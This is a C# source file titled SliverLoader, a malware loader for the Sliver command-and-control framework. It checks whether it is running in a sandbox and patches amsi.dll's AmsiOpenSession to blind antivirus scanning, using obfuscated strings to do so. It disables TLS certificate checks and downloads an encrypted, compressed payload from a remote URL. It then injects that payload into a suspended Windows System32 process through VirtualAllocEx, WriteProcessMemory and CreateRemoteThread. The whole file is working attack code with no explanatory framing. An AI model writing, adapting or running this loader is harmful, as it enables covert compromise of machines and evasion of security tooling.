﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.IO.Compression;
using System.Diagnostics;

namespace SliverLoader
{
    public class Loader
    {
        [StructLayout(LayoutKind.Sequential)]
        public class SecurityAttributes
        {
            public Int32 Length = 0;
            public IntPtr lpSecurityDescriptor = IntPtr.Zero;
            public bool bInheritHandle = false;

            public SecurityAttributes()
            {
                this.Length = Marshal.SizeOf(this);
            }
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct ProcessInformation
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 dwProcessId;
            public Int32 dwThreadId;
        }
        [Flags]
        public enum CreateProcessFlags : uint
        {
            DEBUG_PROCESS = 0x00000001,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            CREATE_SUSPENDED = 0x00000004,
            DETACHED_PROCESS = 0x00000008,
            CREATE_NEW_CONSOLE = 0x00000010,
            NORMAL_PRIORITY_CLASS = 0x00000020,
            IDLE_PRIORITY_CLASS = 0x00000040,
            HIGH_PRIORITY_CLASS = 0x00000080,
            REALTIME_PRIORITY_CLASS = 0x00000100,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            CREATE_SEPARATE_WOW_VDM = 0x00000800,
            CREATE_SHARED_WOW_VDM = 0x00001000,
            CREATE_FORCEDOS = 0x00002000,
            BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
            ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
            INHERIT_PARENT_AFFINITY = 0x00010000,
            INHERIT_CALLER_PRIORITY = 0x00020000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
            PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
            PROCESS_MODE_BACKGROUND_END = 0x00200000,
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NO_WINDOW = 0x08000000,
            PROFILE_USER = 0x10000000,
            PROFILE_KERNEL = 0x20000000,
            PROFILE_SERVER = 0x40000000,
            CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,
        }


        [StructLayout(LayoutKind.Sequential)]
        public class StartupInfo
        {
            public Int32 cb = 0;
            public IntPtr lpReserved = IntPtr.Zero;
            public IntPtr lpDesktop = IntPtr.Zero;
            public IntPtr lpTitle = IntPtr.Zero;
            public Int32 dwX = 0;
            public Int32 dwY = 0;
            public Int32 dwXSize = 0;
            public Int32 dwYSize = 0;
            public Int32 dwXCountChars = 0;
            public Int32 dwYCountChars = 0;
            public Int32 dwFillAttribute = 0;
            public Int32 dwFlags = 0;
            public Int16 wShowWindow = 0;
            public Int16 cbReserved2 = 0;
            public IntPtr lpReserved2 = IntPtr.Zero;
            public IntPtr hStdInput = IntPtr.Zero;
            public IntPtr hStdOutput = IntPtr.Zero;
            public IntPtr hStdError = IntPtr.Zero;
            public StartupInfo()
            {
                this.cb = Marshal.SizeOf(this);
            }
        }
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateProcessA(String lpApplicationName, String lpCommandLine, SecurityAttributes lpProcessAttributes, SecurityAttributes lpThreadAttributes, Boolean bInheritHandles, CreateProcessFlags dwCreationFlags,
                IntPtr lpEnvironment,
                String lpCurrentDirectory,
                [In] StartupInfo lpStartupInfo,
                out ProcessInformation lpProcessInformation

            );

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, IntPtr dwSize, int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern UInt32 FlsAlloc(IntPtr lpCallback);

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        public static extern bool CloseHandle(IntPtr hObject);

        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        private static UInt32 MEM_COMMIT = 0x1000;

        private static int PROCESS_VM_OPERATION = 0x0008;
        private static int PROCESS_VM_READ = 0x0010;
        private static int PROCESS_VM_WRITE = 0x0020;

        public static void DownloadAndExecute(string url, string TargetBinary, string CompressionAlgorithm, byte[] AESKey, byte[] AESIV)
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            UInt32 result = FlsAlloc(IntPtr.Zero);
            if (result != 0xFFFFFFFF)
            {
                return;
            }

            Bypass();

            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            System.Net.WebClient client = new WebClientWithTimeout();

            byte[] encrypted = client.DownloadData(url);
            List<byte> l = new List<byte> { };
            byte[] actual;
            byte[] compressed;
            if (AESKey != null && AESIV != null)
            {


                for (int i = 16; i <= encrypted.Length - 1; i++)
                {
                    l.Add(encrypted[i]);

                }
                actual = l.ToArray();
                compressed = Decrypt(actual, AESKey, AESIV);
            }
            else
            {
                compressed = encrypted;

            }

            byte[] sc = Decompress(compressed, CompressionAlgorithm);
            string binary = TargetBinary;

            Int32 size = sc.Length;
            StartupInfo sInfo = new StartupInfo();
            sInfo.dwFlags = 0;
            ProcessInformation pInfo;
            string binaryPath = "C:\\Windows\\System32\\" + binary;
            IntPtr funcAddr = CreateProcessA(binaryPath, null, null, null, true, CreateProcessFlags.CREATE_SUSPENDED, IntPtr.Zero, null, sInfo, out pInfo);
            IntPtr hProcess = pInfo.hProcess;
            IntPtr spaceAddr = VirtualAllocEx(hProcess, new IntPtr(0), size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            int test = 0;
            IntPtr size2 = new IntPtr(sc.Length);
            bool bWrite = WriteProcessMemory(hProcess, spaceAddr, sc, size2, test);
            CreateRemoteThread(hProcess, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(), new IntPtr(0));
            return;
        }
        public static byte[] Decompress(byte[] data, string CompressionAlgorithm)
        {
            byte[] decompressedArray = null;
            if (CompressionAlgorithm == "deflate9")
            {
                using (MemoryStream decompressedStream = new MemoryStream())
                {
                    using (MemoryStream compressStream = new MemoryStream(data))
                    {
                        using (DeflateStream deflateStream = new DeflateStream(compressStream, CompressionMode.Decompress))
                        {
                            deflateStream.CopyTo(decompressedStream);
                        }
                    }
                    decompressedArray = decompressedStream.ToArray();
                }
                return decompressedArray;
            }
            else if (CompressionAlgorithm == "gzip")
            {
                using (MemoryStream decompressedStream = new MemoryStream())
                {
                    using (MemoryStream compressStream = new MemoryStream(data))
                    {
                        using (GZipStream gzipStream = new GZipStream(compressStream, CompressionMode.Decompress))
                        {
                            gzipStream.CopyTo(decompressedStream);
                        }
                    }
                    decompressedArray = decompressedStream.ToArray();
                }
                return decompressedArray;
            }
            else
            {

                return data;
            }


        }
        public static byte[] Decrypt(byte[] ciphertext, byte[] AESKey, byte[] AESIV)
        {
            byte[] key = AESKey;
            byte[] IV = AESIV;

            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = IV;
                aesAlg.Padding = PaddingMode.None;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream memoryStream = new MemoryStream(ciphertext))
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(ciphertext, 0, ciphertext.Length);
                        return memoryStream.ToArray();
                    }
                }
            }
        }
        public class WebClientWithTimeout : WebClient
        {
            protected override WebRequest GetWebRequest(Uri address)
            {
                WebRequest wr = base.GetWebRequest(address);
                wr.Timeout = 50000000; // timeout in milliseconds (ms)
                return wr;
            }
        }
        static int Bypass()
        {
            Char c1, c2, c3, c4, c5, c6, c7, c8, c9, c10;
            c1 = 'A';
            c2 = 's';
            c3 = 'c';
            c4 = 'n';
            c5 = 'l';
            c6 = 't';
            c7 = 'z';
            c8 = 'U';
            c9 = 'y';
            c10 = 'o';
            string[] filePaths = Directory.GetFiles(@"c:\wind" + c10 + "ws\\s" + c9 + "stem32", "a?s?.d*");
            string libname = (filePaths[0].Substring(filePaths[0].Length - 8));

            byte patch = 0xEB;

            IntPtr hHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, false, Process.GetCurrentProcess().Id);
            if (hHandle != IntPtr.Zero)
            {
                Console.WriteLine("[+] Process opened with Handle ~> " + hHandle);
            }

            IntPtr amsiDLL = LoadLibrary(libname);
            if (amsiDLL != IntPtr.Zero)
            {
                Console.WriteLine("[+] amsi.dll located at ~> " + amsiDLL);
            }

            IntPtr amsiOpenSession = GetProcAddress(amsiDLL, c1 + "m" + c2 + "iOpenSe" + c2 + c2 + "io" + c4);
            if (amsiOpenSession != IntPtr.Zero)
            {
                Console.WriteLine("[+] AmsiOpenSession located at ~> " + amsiOpenSession);
            }

            IntPtr patchAddr = (IntPtr)(amsiOpenSession.ToInt64() + 3);
            Console.WriteLine("[+] Trying to Inject ~> " + patchAddr);

            int bytesWritten = 0;
            bool result = WriteProcessMemory(hHandle, patchAddr, new byte[] { patch }, 1, out bytesWritten);
            if (result)
            {
                Console.WriteLine("[!] Process Memory Injected!");
            }

            CloseHandle(hHandle);
            return 0;
        }
    }
}
